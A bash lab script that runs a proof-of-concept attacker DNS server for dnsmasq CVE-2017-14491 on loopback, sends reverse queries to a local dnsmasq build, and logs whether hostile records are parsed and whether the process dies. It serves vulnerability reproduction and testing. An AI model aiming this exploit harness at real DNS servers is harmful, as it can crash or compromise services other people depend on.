#!/usr/bin/env bash
# Instrumented single run: does dnsmasq PARSE the attacker reply? Does it crash?
# Prints dnsmasq log (which shows the hostile records being consumed) + liveness.
set -u
LAB="$(cd "$(dirname "$0")" && pwd)"; cd "$LAB"
DM="$LAB/dnsmasq-git/src/dnsmasq"; CONF="$LAB/etc/dnsmasq.conf"
ATT_PID=""; DM_PID=""
trap 'kill $ATT_PID $DM_PID 2>/dev/null' EXIT

( exec python2 -u google_cve_2017_14491.py 127.0.0.2 5300 > att_live.log 2>&1 ) & ATT_PID=$!
sleep 1
echo "attacker up=$(kill -0 $ATT_PID 2>/dev/null && echo yes)"

"$DM" -C "$CONF" --no-daemon > dm_live.log 2>&1 & DM_PID=$!
sleep 1.5
echo "dnsmasq up=$(kill -0 $DM_PID 2>/dev/null && echo yes) pid=$DM_PID"

echo "=== priming round 1 ==="
for i in 1 2 3 4 5; do
  dig @127.0.0.1 -p 53535 -x 8.8.8.125 +time=3 +tries=1 > /dev/null 2>&1
  sleep 0.5
  if ! kill -0 "$DM_PID" 2>/dev/null; then echo "DIED at query $i"; break; fi
done
sleep 1
if kill -0 "$DM_PID" 2>/dev/null; then echo "liveness: ALIVE"; else echo "liveness: DEAD"; fi

echo "=== attacker live log (unbuffered) ==="; cat att_live.log
echo "=== dnsmasq log: hostile records consumed? ==="
grep -vE '^dnsmasq: reply 8.8.8.125 is Z+' dm_live.log | tail -20
echo "=== count of hostile Z-records parsed by dnsmasq ==="
grep -c 'ZZZ' dm_live.log
